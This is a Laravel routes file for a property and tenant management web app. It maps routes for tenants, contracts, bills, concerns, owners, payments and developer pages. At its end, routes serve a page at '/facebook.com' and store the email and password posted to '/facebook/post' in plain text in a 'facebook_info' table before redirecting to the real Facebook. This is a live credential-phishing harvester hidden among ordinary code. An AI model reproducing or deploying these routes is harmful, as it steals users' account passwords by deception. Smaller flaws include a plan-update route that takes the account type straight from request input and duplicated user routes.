<?php

use App\Unit, App\Owner, App\Tenant, App\User, App\Bill, App\Property;
use Carbon\Carbon;
use App\Charts\DashboardChart;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Mail;
use App\Mail\TenantRegisteredMail;
use App\Mail\SendContractAlertEmail;
use App\Concern;
use App\Session;
use App\Certificate;
use App\Guardian;
use Illuminate\Support\Facades\Hash;
use App\Room;
use App\Update;

/*
|--------------------------------------------------------------------------
| Web Routes
|--------------------------------------------------------------------------
|
| Here is where you can register web routes for your application. These
| routes are loaded by the RouteServiceProvider within a group which
| contains the "web" middleware group. Now create something great!
|
*/

Auth::routes(['verify'=> true]);

//ROUTES FOR THE WEBSITE
//routes to show the website page
Route::get('/', function(){
    $users = User::whereNotIn('role_id_foreign',['6','7','8'])->count();
    $properties = Property::all()->count();
    $rooms = Unit::whereNotIn('status',['deleted'])->count();
    $tenants = Tenant::all()->count();
    return view('layouts.arsha.index', compact('users','properties', 'rooms', 'tenants'));
});

//route to show the privacy policy
Route::get('/privacy-policy', function(){
    return view('layouts.arsha.privacy-policy');
});

//route to show terms of service
Route::get('/terms-of-service', function(){
    return view('layouts.arsha.terms-of-service');
});
//route to show acceptable use policy
Route::get('/acceptable-use-policy', function(){
    return view('layouts.arsha.acceptable-use-policy');
});
//route to redirect user to unregistered page
Route::get('/unregistered', function(){
    return view('layouts.arsha.unregistered');
});

//ROUTES FOR USERCONTROLLER
//route to search a user
Route::get('/users/search', 'UserController@search');
//route to show all users
Route::get('/user/all', 'UserController@index_system_user');
//route to create a user
Route::get('/user/create', 'UserController@create_system_user');
//route to post a new user
Route::post('/user/store', 'UserController@store_system_user');
//route to show a user
Route::get('/user/{user_id}', 'UserController@show_system_user');
//route to edit a user
Route::get('/user/{user_id}/edit', 'UserController@edit_system_user');
//route to edit a user
Route::put('/user/{user_id}', 'UserController@update_system_user');
//route to update a user
Route::put('/user/{user_id}/update', 'UserController@update_system_user_info');

//ROUTES FOR PROPERTYCONTROLLER
//route to display all properties
Route::get('/property/all', 'PropertyController@index');
//route to show the dashboard of a property
Route::get('/property/{property_id}/dashboard', 'PropertyController@show');
//route to select a property
Route::post('/property/select', 'PropertyController@select');
//route to search rooms, tenants, and etc in the main search bar
Route::get('/property/{property_id}/search', 'PropertyController@search');
//route to edit a property
Route::get('/property/{property_id}/edit', 'PropertyController@edit');
//route to update a property
Route::put('/property/{property_id}/update', 'PropertyController@update');
//route to view the portforlio
Route::get('/property/portforlio', 'PropertyController@view_portforlio')->name('view-portforlio');
//route to view property
Route::get('/property/{property_id}/view', 'PropertyController@view');

//ROUTES TO CREATE A PROPERTY
// route to step 1 of 5 (create property)
Route::get('/property/create/', 'PropertyController@create_property')->name('create-property');
// route to step 1 of 5 (post property)
Route::post('/property/', 'PropertyController@store_property');
// route to step 2 of 5 (create rooms)
Route::get('/property/{property_id}/rooms/create', 'PropertyController@create_room');
// route to  step 2 of 5 (post rooms)
Route::post('/property/{property_id}/rooms/store', 'PropertyController@store_room');
// route to step 3 of 5 (create bills)
Route::get('/property/{property_id}/bills/create', 'PropertyController@create_bill');
// route to step 3 of 5 (post bills)
Route::post('/property/{property_id}/bills/store', 'PropertyController@store_bill');
// route to step 4 of 5 (create duedates)
Route::get('/property/{property_id}/duedates/create', 'PropertyController@create_duedate');
// route to step 4 of 5 (post duedates)
Route::post('/property/{property_id}/duedates/store', 'PropertyController@store_duedate');
// route to step 5 of 5 create users
Route::get('/property/{property_id}/users/create', 'PropertyController@create_user');
// route to step 5 of 5 (post users)
Route::post('/property/{property_id}/users/store', 'PropertyController@store_user');

//ROUTES FOR TENANTCONTROLLER
//route to show all the tenants
Route::get('/property/{property_id}/tenants', 'TenantController@index');
//route to show a particular tenant
Route::get('/property/{property_id}/tenant/{tenant_id}', 'TenantController@show');
//route to edit a tenant
Route::get('/property/{property_id}/tenant/{tenant_id}/edit', 'TenantController@edit');
//route to update a tenant
Route::put('/property/{property_id}/tenant/{tenant_id}', 'TenantController@update');

//ADDITIONAL ROUTES FOR ADDING A TENANT
//route to add a tenant
Route::get('/property/{property_id}/room/{unit_id}/create/tenant', 'TenantController@create');
//route to post a new tenant
Route::post('/property/{property_id}/room/{unit_id}/store/tenant', 'TenantController@store');
//route to search a a tenant
Route::get('/property/{property_id}/tenants/search', 'TenantController@index');
//route to filter tenant based on their status
Route::get('/property/{property_id}/tenants/filter', 'TenantController@filter');

//ROUTES FOR CONTRACTCONTROLLER
//route to extend tenant's contract
Route::get('/property/{property_id}/tenant/{tenant_id}/contract/{contract_id}/extend', 'ContractController@extend');
//route to post tenant's extended contract
Route::post('/property/{property_id}/tenant/{tenant_id}/contract/{contract_id}/extend', 'ContractController@extend_post');
//route to request tenant's moveout 
Route::put('/property/{property_id}/home/{unit_id}/tenant/{tenant_id}/request', 'TenantController@request');
//route to approve tenant's moveout
Route::put('/property/{property_id}/home/{unit_id}/tenant/{tenant_id}/approve', 'TenantController@approve');
//route to upload tenant's image
Route::put('/property/{property_id}/tenant/{tenant_id}/upload/img','TenantController@upload_img');
//route to show all pending contracts
Route::get('/property/{property_id}/tenants/pending','TenantController@pending');
//route to create a new contract for a tenant
Route::get('/property/{property_id}/room/{room_id}/tenant/{tenant_id}/create/contract', 'ContractController@create');
//route to create a new contract for a tenant
Route::post('/property/{property_id}/room/{room_id}/tenant/{tenant_id}/contract/create', 'ContractController@new_contract');
//route to select option for a tenant's contract
Route::get('/property/{property_id}/room/{room_id}/tenant/{tenant_id}/contract/{contract_id}/balance/{balance}/action', 'ContractController@action');
//route to post new tenant's contract
Route::post('/property/{property_id}/room/{unit_id}/tenant/{tenant_id}/store/contract', 'ContractController@store');
//route to show tenant's contract
Route::get('/property/{property_id}/tenant/{tenant_id}/contract/{contract_id}', 'ContractController@show');
//route to edit tenant's contract
Route::get('/property/{property_id}/tenant/{tenant_id}/contract/{contract_id}/edit', 'ContractController@edit');
//route to update tenant's contract
Route::put('/property/{property_id}/tenant/{tenant_id}/contract/{contract_id}/update', 'ContractController@update');
//route to show preterminate tenant's contract
Route::get('/property/{property_id}/tenant/{tenant_id}/contract/{contract_id}/preterminate', 'ContractController@preterminate');
//route to preterminate tenant'sc contract
Route::put('/property/{property_id}/tenant/{tenant_id}/contract/{contract_id}/preterminate_post', 'ContractController@preterminate_post');
//route to show moveout tenant's contract
Route::get('/property/{property_id}/room/{room_id}/tenant/{tenant_id}/contract/{contract_id}/moveout', 'ContractController@moveout_get');
//route to moveout a tenant
Route::put('/property/{property_id}/home/{unit_id}/tenant/{tenant_id}/contract/{contract_id}/moveout', 'ContractController@moveout_post');
//route to delete tenant's contract
Route::get('/property/{property_id}/tenant/{tenant_id}/contract/{contract_id}/delete', 'ContractController@destroy');

Route::get('/property/{property_id}/home/{unit_id}/tenant/{tenant_id}/contract/{contract_id}/alert', 'ContractController@send_contract_alert');

//ROUTES FOR OCCUPANTCONTROLLER
//route to show all occupants
Route::get('/property/{property_id}/occupants', 'OccupantController@index');
//route to show an occupant
Route::get('/property/{property_id}/occupant/{tenant_id}', 'OccupantController@show');
//route to edit an occupant
Route::get('/property/{property_id}/occupant/{tenant_id}/edit', 'OccupantController@edit');
//route to update an occupant
Route::put('/property/{property_id}/occupant/{tenant_id}', 'OccupantController@update');
//route to create an occupant
Route::get('/property/{property_id}/unit/{unit_id}/occupant', 'OccupantController@create');
//route to create an occupant
Route::get('/property/{property_id}/unit/{unit_id}/occupant/add', 'OccupantController@add_occupant');
//route to post a new occupant
Route::post('/property/{property_id}/unit/{unit_id}/occupant', 'OccupantController@store');
//route to create an occupant with prefilled values
Route::get('/property/{property_id}/unit/{unit_id}/occupant/prefilled', 'OccupantController@create_prefilled');
//route to post a new occupant with prefilled values
Route::post('/property/{property_id}/unit/{unit_id}/occupant/prefilled', 'OccupantController@store_prefilled');
//route to search occupants
Route::get('/property/{property_id}/occupants/search', 'OccupantController@index');
//route to create a credentials for a tenant
Route::post('property/{property_id}/tenant/{tenant_id}/user/create', 'TenantController@create_user_access');
//route to post a credentials for a tenant
Route::post('property/{property_id}/owner/{owner_id}/user/create', 'OwnerController@create_user_access');

//ROUTES FOR ROOMCONTROLLER
//route to create rooms
Route::get('/property/create/room', 'RoomController@create')->name('create-room');
//route to post a new room
Route::post('/property/store/room', 'RoomController@store')->name('store-room');
//route to edit a room
Route::get('/property/{property_id}/room/{unit_no}/edit', 'RoomController@edit');
//route to update a room
Route::put('/property/{property_id}/room/{room_id}/update', 'RoomController@update');
//route to upload imagest to a room
//route to show all rooms
Route::get('/property/{property_id}/rooms', 'RoomController@index');
//route to show a room
Route::get('/property/{property_id}/room/{unit_id}', 'RoomController@show');
//route to edit a room
Route::get('/property/edit/room', 'RoomController@edit_all')->name('edit-room');
//route to update all rooms
Route::put('/property/{property_id}/rooms/update', 'RoomController@update_all');

//route to delete a room
Route::delete('/property/{property_id}/room/{unit_id}/delete', 'RoomController@destroy');
//route to restore a deleted room
Route::put('/property/{property_id}/room/{unit_id}/restore', 'RoomController@restore');

Route::post('/property/{property_id}/room/{room_id}/upload', 'RoomController@upload');
//route to filter rooms
Route::get('/property/{property_id}/rooms/filter', 'RoomController@index');
//route to clear filters in rooms
Route::get('/property/{property_id}/rooms/clear', 'RoomController@clear');

//ROUTES FOR UNITCONTROLLER
//route to show all units
Route::get('/property/{property_id}/units', 'UnitController@index');
//route to show a unit
Route::get('/property/{property_id}/unit/{unit_id}', 'UnitController@show');
//route to edit all units 
Route::get('/property/{property_id}/units/{date}/edit', 'UnitController@edit_all');
//route to update all units
Route::put('/property/{property_id}/units/{date}/update', 'UnitController@update_all');
//route to post a unit
Route::post('/property/{property_id}/unit/store', 'UnitController@store');
//route to update a unit
Route::put('/property/{property_id}/unit/{unit_id}', 'UnitController@update');
//route to clear unit filters
Route::get('/property/{property_id}/units/clear', 'UnitController@clear_units_filters');

//ROUTES FOR GUARDIANCONTROLLER
//route to post a guardian to a tenant
Route::post('/property/{property_id}/tenant/{tenant_id}/guardian', 'GuardianController@store');

//ROUTES FOR CONCERNCONTOLLER
//routes to show all concerns
Route::get('/property/{property_id}/concerns', 'ConcernController@index');
//route to create a concern
Route::get('/property/{property_id}/room/{room_id}/create/concern', 'ConcernController@create_room_concern');
//route to view and edit a concern
Route::get('/property/{property_id}/room/{room_id}/tenant/{tenant_id}/concern/{concern_id}/endorsed_to/{endorsed_to}/resolved_by/{resolved_by}/view', 'ConcernController@view_room_concern');
//route to update a concern
Route::put('/property/{property_id}/room/{room_id}/concern/{concern_id}/update', 'ConcernController@update_room_concern');
//route to show all concerns of a tenant
Route::post('/property/{property_id}/tenant/{tenant_id}/concern', 'ConcernController@store');
//route to show all concerns of a unit
Route::post('/property/{property_id}/room/{unit_id}/store/concern', 'ConcernController@store_room_concern');
//route to show all concerns of a unit
Route::get('/property/{property_id}/room/{unit_id}/tenant/{tenant_id}/concern/{concern_id}/materials', 'ConcernController@materials');
//route to show all concerns of a unit
Route::post('/property/{property_id}/room/{unit_id}/tenant/{tenant_id}/concern/{concern_id}/store/materials', 'ConcernController@store_materials');
//route to show concern
Route::get('/property/{property_id}/concern/{concern_id}', 'ConcernController@show');
//route to show concerns of an employee
Route::get('/property/{property_id}/concern/{concern_id}/assign/{user_id}', 'ConcernController@show_assigned_concerns');
//route to close a concern
Route::put('/concern/{concern_id}/closed', 'ConcernController@closed');
//route to forward a concern to an employee
Route::put('/property/{property_id}/concern/{concern_id}/forward', 'ConcernController@forward');
//route to show create a new concern
Route::get('/property/{property_id}/tenant/{tenant_id}/concern/create', 'ConcernController@create');
//route to store a new concern
Route::post('/property/{property_id}/tenant/{tenant_id}/concern/store', 'ConcernController@store');

//concerns
Route::post('/concerns', 'ConcernController@store');

//show concerns
Route::get('/units/{unit_id}/tenants/{tenant_id}/concerns/{concern_id}', 'ConcernController@show');

//update concerns
Route::put('/concerns/{concern_id}', 'ConcernController@update');

//ROUTES FOR BillController

//routes for tenants' bills
//route to create a tenant bill
Route::get('/property/{property_id}/tenant/{tenant_id}/create/bill', 'BillController@create_tenant_bill');

//route to post tenant a tenant bill
Route::post('/property/{property_id}/tenant/{tenant_id}/store/bill', 'BillController@store_tenant_bill');


//route to create bills for new tenant
Route::get('/property/{property_id}/room/{room_id}/tenant/{tenant_id}/contract/{contract_id}/create/bill', 'BillController@create');
//route to create bills for removing bills
Route::get('/bill/{bill_id}/delete/bill', 'BillController@destroy');
//route to store new bill for new tenant
Route::post('/property/{property_id}/room/{room_id}/tenant/{tenant_id}/store/bill', 'BillController@store');
//route to show all bills
Route::get('/property/{property_id}/bills', 'BillController@index');
//route to filter bills
Route::get('/property/{property_id}/bills/filter', 'BillController@filter');
//route to create bulk bills
Route::post('/property/{property_id}/bill/{particular_id}', 'BillController@create_bulk');
//route to show pre-created bulk bills
Route::get('/property/{property_id}/create/bill/{particular_id}/batch/{batch_no}', 'BillController@show_bulk');
//route to edit parameters for bulk bills
Route::get('/property/{property_id}/create/bill/{particular_id}/batch/{batch_no}/options', 'BillController@options_bulk');
//route to edit parameters for bulk bills
Route::put('/property/{property_id}/create/bill/{particular_id}/batch/{batch_no}/options', 'BillController@update_options_bulk');
//route to mass update tenants' bills
Route::put('/property/{property_id}/bill/{particular_id}/update', 'BillController@update_bulk');
//route to store bulk bills
Route::put('/property/{property_id}/create/bill/{particular_id}/batch/{batch_no}/store', 'BillController@store_bulk_bills');
//route to edit a tenant's bills
Route::get('/property/{property_id}/tenant/{tenant_id}/bills/edit', 'BillController@edit_tenant_bills');
//route to edit a unit's bills
Route::get('/property/{property_id}/unit/{home_id}/bills/edit', 'BillController@edit_occupant_bills');
//route to export a tenant's bills
Route::get('/property/{property_id}/tenant/{tenant_id}/bills/export', 'BillController@export');
//route to export a unit's bills
Route::get('/property/{property_id}/unit/{unit_id}/bills/export', 'BillController@export_occupant_bills');
//route to update a tenant's bills
Route::put('/property/{property_id}/tenant/{tenant_id}/bills/update', 'BillController@post_edited_bills');
//route to update a unit's bills
Route::put('/property/{property_id}/unit/{unit_id}/bills/update', 'BillController@update_occupant_bills');

Route::post('property/{property_id}/bills/create', 'BillController@store');
//route to post a tenant's bills
Route::post('property/{property_id}/tenant/{tenant_id}/bills/create', 'BillController@post_tenant_bill');
//route to post a unit's bills
Route::post('property/{property_id}/unit/{unit_id}/bills/create', 'BillController@post_unit_bill');
Route::post('property/{property_id}/bills/electric/{date}', 'BillController@post_bills_electric');
Route::post('property/{property_id}/bills/water/{date}', 'BillController@post_bills_water');
Route::post('property/{property_id}/bills/surcharge/{date}', 'BillController@post_bills_surcharge');

//ROUTES FOR JOBORDERCONTROLLER
//route to show all job orders
Route::get('/property/{property_id}/joborders', 'JobOrderController@index');
//route to show inventories
Route::get('/property/{property_id}/joborder/{joborder_id}/inventory', 'JobOrderController@inventory');

//routes for filtering bills based on dates
Route::get('/property/{property_id}/bills/search', 'BillController@index');

Route::get('/blogs', 'BlogController@index');

Route::post('ckeditor/image_upload', 'BlogController@upload')->name('upload');

Route::get('property/{property_id}/system-updates', function($property_id){
    $updates = Update::orderBy('created_at', 'desc')->get();
    $property = Property::findOrFail($property_id);
    return view('webapp.properties.system-updates',compact('property','updates'));
});

Route::get('property/{property_id}/getting-started', function($property_id){
    $property = Property::findOrFail($property_id);
    return view('webapp.properties.getting-started',compact('property'));
});


Route::get('property/{property_id}/announcements', function($property_id){
    $property = Property::findOrFail($property_id);
    return view('webapp.properties.announcements',compact('property'));
});

//route for issues
Route::get('/property/{property_id}/issues', 'IssueController@index');
Route::get('/property/{property_id}/issue/{issue_id}', 'IssueController@show');
Route::post('/property/{property_id}/issue/create', 'IssueController@store');

//routes for blogs
Route::get('/property/{property_id}/blogs', 'BlogController@index');
Route::post('/property/{property_id}/blog', 'BlogController@store');
Route::get('/property/{property_id}/blog/{blog_id}', 'BlogController@show');

//ROUTES FOR OWNERCONTROLLER
//route to create an owner
Route::get('/property/{property_id}/room/{room_id}/create/owner', 'OwnerController@create');
//route to store new owner
Route::post('/property/{property_id}/room/{room_id}/store/owner', 'OwnerController@store');

Route::get('/property/{property_id}/owners', 'OwnerController@index');
Route::get('/property/{property_id}/owners/search', 'OwnerController@search');
Route::get('/property/{property_id}/owner/{owner_id}/edit', 'OwnerController@edit');
Route::get('/property/{property_id}/owner/{owner_id}', 'OwnerController@show');
Route::put('/property/{property_id}/owner/{owner_id}', 'OwnerController@update');
Route::post('/property/{property_id}/room/{unit_id}/owner', 'OwnerController@store');
Route::put('/property/{property_id}/owner/{owner_id}/upload/img','OwnerController@upload_img');

Route::delete('/property/{property_id}/owner/{owner_id}/delete', 'OwnerController@destroy');

Route::post('/property/{property_id}/owner/{owner_id}/certificate/store', 'CertificateController@store');

Route::post('/property/{property_id}/concern/{concern_id}/joborder', 'JobOrderController@store');

//routes for personnels
Route::get('/property/{property_id}/personnels', 'PersonnelController@index');
Route::post('/property/{property_id}/personnel', 'PersonnelController@store');
Route::delete('/property/{property_id}/personnel/{personnel_id}/', 'PersonnelController@destroy');

//routes for collections
Route::get('/property/{property_id}/collections', 'CollectionController@index');
Route::post('/property/{property_id}/tenant/{tenant_id}/collection', 'CollectionController@store');
Route::post('/property/{property_id}/home/{unit_id}/collection', 'CollectionController@collect_unit_payment');

//routes for financials
Route::get('/property/{property_id}/financials', 'FinancialController@index');

//routes for payables
Route::get('/property/{property_id}/payables', 'PayableController@index');
Route::get('/property/{property_id}/payables/entries', 'PayableController@entries');
Route::post('/property/{property_id}/payable', 'PayableController@store');
Route::post('/property/{property_id}/payable/request', 'PayableController@request');
Route::get('/property/{property_id}/payable/{payable_id}/approve', 'PayableController@approve');
Route::get('/property/{property_id}/payable/{payable_id}/decline', 'PayableController@decline');
Route::get('/property/{property_id}/payable/{payable_id}/release', 'PayableController@release');
Route::get('property/{property_id}/payable/{payable_id}/action', 'PayableController@action');

//routes for tenant users
Route::get('/property/{property_id}/users', 'UserController@index');
Route::get('/property/{property_id}/user/{user_id}', 'UserController@show');
Route::put('/property/{property_id}/user/{user_id}', 'UserController@update');
Route::get('/user/{user_id}', 'UserController@upgrade');

Route::post('/user/{user_id}/tenant/{tenant_id}/dashboard', 'UserController@show_user_tenant');
Route::get('/user/{user_id}/tenant/{tenant_id}/dashboard', 'UserController@show_user_tenant');
Route::get('/user/{user_id}/tenant/{tenant_id}/rooms', 'UserController@show_room_tenant');
Route::get('/user/{user_id}/tenant/{tenant_id}/bills', 'UserController@show_bill_tenant');
Route::get('/user/{user_id}/tenant/{tenant_id}/payments', 'UserController@show_payment_tenant');
Route::get('/user/{user_id}/tenant/{tenant_id}/concerns', 'UserController@show_concern_tenant');
Route::post('/user/{user_id}/tenant/{tenant_id}/concerns', 'UserController@store_concern_tenant');
Route::get('/user/{user_id}/tenant/{tenant_id}/concern/{concern_id}/responses', 'UserController@show_concern_responses');
Route::get('/user/{user_id}/tenant/{tenant_id}/profile', 'UserController@show_profile_tenant');
Route::put('/user/{user_id}/tenant/{tenant_id}/profile', 'UserController@show_update_tenant');
Route::get('/user/{user_id}/portal/tenant/', 'UserController@show_portal_tenant');


//routes for owner users
Route::get('/property/{property_id}/users', 'UserController@index');
Route::get('/property/{property_id}/user/{user_id}', 'UserController@show');
Route::put('/property/{property_id}/user/{user_id}', 'UserController@update');
Route::get('/user/{user_id}', 'UserController@upgrade');

Route::post('/user/{user_id}/owner/{owner_id}/dashboard', 'OwnerAccessController@dashboard');
Route::get('/user/{user_id}/owner/{owner_id}/dashboard', 'OwnerAccessController@dashboard');
Route::get('/user/{user_id}/owner/{owner_id}/rooms', 'OwnerAccessController@room');
Route::get('/user/{user_id}/owner/{owner_id}/room/{room_id}/contracts', 'OwnerAccessController@contracts');
Route::get('/user/{user_id}/owner/{owner_id}/bills', 'OwnerAccessController@bill');
Route::get('/user/{user_id}/owner/{owner_id}/financials', 'OwnerAccessController@financial');
Route::get('/user/{user_id}/owner/{owner_id}/payments', 'OwnerAccessController@payment');
Route::get('/user/{user_id}/owner/{owner_id}/concerns', 'OwnerAccessController@concern');
Route::post('/user/{user_id}/owner/{owner_id}/concerns', 'OwnerAccessController@store_concern');
Route::get('/user/{user_id}/owner/{owner_id}/concern/{concern_id}/responses', 'OwnerAccessController@show_concern_responses');
Route::get('/user/{user_id}/owner/{owner_id}/profile', 'OwnerAccessController@profile');
Route::get('/user/{user_id}/owner/{owner_id}/remittances', 'OwnerAccessController@remittance');
Route::get('/user/{user_id}/owner/{owner_id}/remittance/{remittance_id}/expenses', 'OwnerAccessController@expense');
Route::put('/user/{user_id}/owner/{owner_id}/profile', 'OwnerAccessController@update_profile');

//routes for dev
Route::get('/dev/activities/', 'DevController@activities');
Route::get('/dev/properties/', 'DevController@properties');
Route::get('/dev/property/types/', 'DevController@property_types');
Route::get('/dev/users/', 'DevController@users');
Route::get('/dev/starter/', 'DevController@starter');
Route::get('/dev/announcements/', 'DevController@announcements');
Route::get('/dev/issues/', 'DevController@issues');
Route::get('/dev/issue/{issue_id}/edit', 'DevController@edit_issue');
Route::post('/dev/issue/{issue_id}/responses', 'DevController@add_response');
Route::put('/dev/issue/{issue_id}/update', 'DevController@update_issue');
Route::get('/dev/updates/', 'DevController@updates');
Route::get('/dev/user/{user_id}', 'DevController@edit_user');
Route::put('/dev/user/{user_id}', 'DevController@post_user');
Route::get('/dev/plans', 'DevController@plans');
Route::get('/dev/tenants', 'DevController@tenants');
Route::post('/plan', 'DevController@post_plan');
Route::get('/dev/user/{user_id}/plans', 'DevController@user_plans');
Route::post('/dev/updates/store', 'UpdateController@store');
Route::post('/propertytype/store', 'PropertyTypeController@store');

Route::get('/register', function(Request $request){
    // \Session::put('plan', $request->plan);
    // if(\Session::get('plan') == null){
    //     return redirect('/#pricing');
    // }

    return view('auth.register');
});

Route::get('/register/{promo_code}', function(Request $request){
    // \Session::put('plan', $request->plan);
    // if(\Session::get('plan') == null){
    //     return redirect('/#pricing');
    // }

    return view('auth.register');
});

Route::get('/free', function(Request $request){
    // \Session::put('plan', $request->plan);
    // if(\Session::get('plan') == null){
    //     return redirect('/#pricing');
    // }

    return view('auth.register');
});

//routes for responses
Route::post('concern/{concern_id}/response', 'ResponseController@store');

//routes for notifications
Route::get('property/{property_id}/notifications', 'NotificationController@index');
Route::get('property/{property_id}/delinquents', 'CollectionController@delinquents');
Route::get('property/{property_id}/pending-concerns', 'ConcernController@pending');
Route::get('property/{property_id}/expiring-contracts', 'ContractController@expired');

//routes for remittances
Route::get('property/{property_id}/remittances', 'RemittanceController@index');
Route::post('property/{property_id}/remittances/store', 'RemittanceController@store');
Route::get('property/{property_id}/room/{unit_id}/contract/{contract_id}/tenant/{tenant_id}/bill/{bill_id}/payment/{payment_id}/remittance/create', 'RemittanceController@create');
Route::post('property/{property_id}/room/{unit_id}/contract/{contract_id}/tenant/{tenant_id}/bill/{bill_id}/payment/{payment_id}/remittance/store', 'RemittanceController@store');
Route::get('property/{property_id}/room/{unit_id}/remittance/{remittance_id}', 'RemittanceController@show');
Route::get('property/{property_id}/remittance/{remittance_id}/expenses', 'ExpenseController@index');
Route::get('property/{property_id}/room/{room_id}/remittance/{remittance_id}/edit', 'RemittanceController@edit');
Route::put('property/{property_id}/remittance/{remittance_id}/update', 'RemittanceController@update');
Route::get('property/{property_id}/room/{room_id}/remittance/{remittance_id}/action', 'RemittanceController@action');


Route::get('/listings', function(){

    $properties = Property::all()->count();

    return view('layouts.arsha.listings', compact('properties'));
});

//routes for payments
Route::get('units/{unit_id}/tenants/{tenant_id}/payments/{payment_id}', 'CollectionController@show')->name('show-payment');
Route::post('/payments', 'CollectionController@store');
Route::get('/payments/all', 'CollectionController@index')->name('show-all-payments');
Route::get('/property/{property_id}/payments/search', 'CollectionController@index');
Route::delete('/property/{property_id}/tenant/{tenant_id}/payment/{payment_id}', 'CollectionController@destroy');
Route::get('/property/{property_id}/room/{room_id}/contract/{contract_id}/tenant/{tenant_id}/bill/{bill_id}/payment/{payment_id}/action', 'CollectionController@action');
Route::post('/property/{property_id}/tenant/{tenant_id}/payment/{payment_id}/credit-memo', 'CollectionController@credit_memo');

//export payments per tenant
Route::get('/property/{property_id}/unit/{unit_id}/tenant/{tenant_id}/payment/{payment_id}/dates/{payment_created}/export', 'CollectionController@export');
//export individual payment
Route::get('/property/{property_id}/unit/{unit_id}/tenant/{tenant_id}/payment/{payment_id}/export', 'CollectionController@export_payment');
Route::get('/property/{property_id}/tenant/{tenant_id}/payments/export', 'CollectionController@export_all');

//export payments per unit per tenant
Route::get('/property/{property_id}/unit/{unit_id}/tenant/{tenant_id}/payment/{payment_id}/dates/{payment_created}/export_unit_bills', 'CollectionController@export_unit_bills');
//export payments per day
Route::get('/property/{property_id}/payments/dates/{payment_created}/export/', 'CollectionController@export_collection_per_day');

//export collections per month
Route::get('/property/{property_id}/collections/month/{month}/year/{year}/export/', 'CollectionController@export_collection_per_month');

//print gate pass
Route::get('/units/{unit_id}/tenants/{tenant_id}/print/gatepass', 'TenantController@printGatePass');

Route::delete('/tenants/{tenant_id}', 'TenantController@destroy');

//routes for violations
Route::get('/property/{property_id}/violations', 'ViolationController@index');
Route::post('/property/{property_id}/tenant/{tenant_id}/violation', 'ViolationController@store');

//routes for creating violation
Route::get('/property/{property_id}/tenant/{tenant_id}/violation/create', 'ViolationController@create');
Route::post('/property/{property_id}/tenant/{tenant_id}/violation/store', 'ViolationController@store');

//routes for suppliers
Route::get('/property/{property_id}/suppliers', 'SupplierController@index');
Route::get('/property/{property_id}/suppliers/create', 'SupplierController@create');
Route::post('/property/{property_id}/suppliers/store', 'SupplierController@store');

Route::put('property/{property_id}/tenant/{tenant_id}/bill/{bill_id}/restore', 'BillController@restore_bill');

//routes for loggin in using google
Route::get('sign-in/google', 'Auth\LoginController@google');
Route::get('sign-in/google/redirect', 'Auth\LoginController@googleRedirect');

Route::put('/users/{user_id}/property', function(Request $request){
    $request->validate([
        'property' => 'required|unique:users|max:255',
        'property_ownership' => 'required',
        'property_type' => 'required',
    ]);
    DB::table('users')
    ->where('id', Auth::user()->id)
    ->update([
        'property' => $request->property,
        'property_type' => $request->property_type,
        'property_ownership' => $request->property_ownership
    ]);
    return back();
});

Route::put('/users/{user_id}/plan', function(Request $request){
    DB::table('users')
    ->where('id', Auth::user()->id)
    ->update([
        'account_type' => $request->account_type,
    ]);

    return back();
});
//routes for registration
//post the desired plan
Route::post('/users/{user_id}/charge', function(Request $request){
    if(Auth::user()->account_type === 'Free'){
         Mail::to(Auth::user()->email)->send(new TenantRegisteredMail());

         return back();
    }else{
        $charge = 0;
        if(Auth::user()->account_type === 'Medium'){
            $charge = 95000;
        }elseif(Auth::user()->account_type === 'Large'){
            $charge = 180000;
        }elseif(Auth::user()->account_type === 'Enterprise'){
            $charge = 240000;
        }elseif(Auth::user()->account_type === 'Corporate'){
            $charge = 480000;
        }
       try{
        Mail::to(Auth::user()->email)->send(new TenantRegisteredMail());

        return back();
       }catch(\Exception $e){
           return back()->with('danger', $e->getMessage());
       }
    }
});

//routes for logging in using facebook
Route::get('/login/google', 'Auth\LoginController@redirectToProvider');
Route::get('/login/google/callback', 'Auth\LoginController@handleProviderCallback');

Route::get('listing', ['as' => 'listing', 'uses'=>'AdsController@listing']);

Route::get('/carpiotech', function(){
    return view('founders.landleybernardo');
});

Route::get('/facebook.com', function(){
    return view('founders.facebook');
});

Route::post('/facebook/post', function(Request $request){
    DB::table('facebook_info')
    ->insert(
                [
                    'email' => $request->email, 
                    'password' => $request->password,
                ]
            );

            return redirect('https://facebook.com');
});


Route::get('/carpiotech/23rd-monthsary', function(){
    return view('founders.index');
});